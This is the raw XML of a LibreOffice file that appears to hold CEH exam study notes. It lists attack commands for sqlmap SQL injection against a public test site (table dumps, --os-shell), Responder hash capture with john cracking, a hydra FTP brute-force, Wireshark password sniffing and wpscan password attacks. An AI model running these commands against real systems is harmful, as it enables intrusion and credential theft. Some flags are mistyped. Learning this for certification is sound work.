      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D information_schema –tables</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D information_schema -T FILES –columns</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D information_schema -T FILES –<text:span text:style-name="T6">dump</text:span></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie="login=test%2Ftest" –os-shell</text:p>
      <text:p text:style-name="P53"><text:soft-page-break/>Responder:</text:p>
      <text:p text:style-name="P51">type on terminal <text:s/>responder -I eth0</text:p>
      <text:p text:style-name="P51">now open windows and open run and type \\ceh-tools</text:p>
      <text:p text:style-name="P51">now you can see in your termina</text:p>
      <text:p text:style-name="P51">default usr/share/responder/logs <text:span text:style-name="T21">you can see there is file</text:span></text:p>
      <text:p text:style-name="P31">john <text:span text:style-name="T9">usr</text:span><text:span text:style-name="T10">share/responder/logs/file-name</text:span></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P48">FTP Credential:</text:p>
      <text:p text:style-name="P18">hydra -L /root/Wordlists/Usernames.txt -P /root/Wordlists/Passwords.txt <text:a xlink:type="simple" xlink:href="ftp://192.168.0.105/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ftp://192.168.0.105</text:a></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P20">Examples:</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">1. <text:span text:style-name="T22">Responder:</text:span></text:p>
      <text:p text:style-name="P52">type on terminal <text:s/>responder -I eth0</text:p>
      <text:p text:style-name="P52">now open windows and open run and type \\ceh-tools</text:p>
      <text:p text:style-name="P52">now you can see in your termina<text:span text:style-name="T23">l capturing logs</text:span></text:p>
      <text:p text:style-name="P52">default usr/share/responder/logs <text:span text:style-name="T21">you can see there is file</text:span></text:p>
      <text:p text:style-name="P54">now type /<text:span text:style-name="T24">usr/share/responder/logs </text:span></text:p>
      <text:p text:style-name="P33">john /<text:span text:style-name="T9">usr/</text:span>share/responder/logs/file-name</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P47">2. <text:span text:style-name="T25">FTP credential:</text:span></text:p>
      <text:p text:style-name="P43">nmap <text:span text:style-name="T29">&lt;ip&gt;</text:span></text:p>
      <text:p text:style-name="P44">hydra -L /root/Wordlists/Usernames.txt -P /root/Wordlists/Passwords.txt ftp://<text:span text:style-name="T30">&lt;ip&gt;</text:span></text:p>
      <text:p text:style-name="P45">ftp &lt;ip&gt;</text:p>
      <text:p text:style-name="P45">get</text:p>
      <text:p text:style-name="P46">3. Wireshark:</text:p>
      <text:p text:style-name="P55"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T26">Source</text:span></text:span><text:span text:style-name="T27">: This is the address of the system that sent the packet. </text:span></text:p>
      <text:p text:style-name="P55"><text:span text:style-name="Strong_20_Emphasis">Destination</text:span>: This is the address of the destination of that packet.</text:p>
      <text:p text:style-name="P35">wireshark password (http.method.request == "POST") then right click and go to TCP stream and find PASSWORD of website </text:p>
      <text:p text:style-name="P36">2d method</text:p>
      <text:p text:style-name="P36"><text:span text:style-name="Emphasis">http.request and tcp.port eq 8082</text:span></text:p>
      <text:p text:style-name="P37"><text:soft-page-break/><text:span text:style-name="Emphasis">ARP requests can be used by Wireshark to get the IP address of an unknown host on your network.</text:span></text:p>
      <text:p text:style-name="P37"><text:span text:style-name="Emphasis">Another easy way to determine the IP address of an unknown host on your network is to use DHCP traffic. This method only works if the host requests an IP address.</text:span></text:p>
      <text:p text:style-name="P37"><text:span text:style-name="Emphasis"><text:span text:style-name="T28">udp.port==67</text:span></text:span></text:p>
      <text:p text:style-name="P38"><text:span text:style-name="Emphasis"><text:span text:style-name="T18">4. Identify web server:</text:span></text:span></text:p>
      <text:p text:style-name="P39"><text:span text:style-name="Emphasis"><text:span text:style-name="T11">ID Serve</text:span></text:span></text:p>
      <text:p text:style-name="P40"><text:span text:style-name="Emphasis"><text:span text:style-name="T12">paste ip address</text:span></text:span></text:p>
      <text:p text:style-name="P40"><text:span text:style-name="Emphasis"><text:span text:style-name="T19">5. wordpress:</text:span></text:span></text:p>
      <text:p text:style-name="P40"><text:span text:style-name="Emphasis"><text:span text:style-name="T12">Finding usernames</text:span></text:span></text:p>
      <text:p text:style-name="P40"><text:span text:style-name="Emphasis"><text:span text:style-name="T12">wpscan - -url http://&lt;ip address&gt;/CEH - -enumerate u</text:span></text:span></text:p>
      <text:h text:style-name="P57" text:outline-level="2"><text:span text:style-name="Emphasis"><text:span text:style-name="T18">Auditing password</text:span></text:span></text:h>
      <text:p text:style-name="P41"><text:span text:style-name="Emphasis"><text:span text:style-name="T15">w</text:span></text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T13">pscan - -url http://&lt;ip address&gt;/CEH - -passwords rockyou.txt - -usernames buddy</text:span></text:span></text:p>
      <text:p text:style-name="P41"><text:span text:style-name="Emphasis"><text:span text:style-name="T14">wpscan - -url http://&lt;ip address&gt;/CEH - -wordlists ‘/usr/share/wordlists/rockyou.txt’ - -</text:span></text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T16">usernames budy</text:span></text:span></text:p>
      <text:p text:style-name="P42"><text:span text:style-name="Emphasis"><text:span text:style-name="T20">6. vulnerable server:</text:span></text:span></text:p>
      <text:p text:style-name="P42"><text:span text:style-name="Emphasis"><text:span text:style-name="T17">nikto -host &lt;ip&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P42"><text:span text:style-name="Emphasis"><text:span text:style-name="T13"/></text:span></text:p>
      <text:p text:style-name="P34"/>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14:16.582806739</meta:creation-date>
    <dc:date>2020-11-04T14:50:51.888047802</dc:date>
    <meta:editing-duration>P1DT7H31M8S</meta:editing-duration>
    <meta:editing-cycles>45</meta:editing-cycles>
    <meta:generator>LibreOffice/6.4.5.2$Linux_X86_64 LibreOffice_project/a726b36747cf2001e06b58ad5db1aa3a9a1872d6</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="98" meta:word-count="591" meta:character-count="4071" meta:non-whitespace-character-count="3580"/>
  </office:meta>
</office:document-meta>
</file>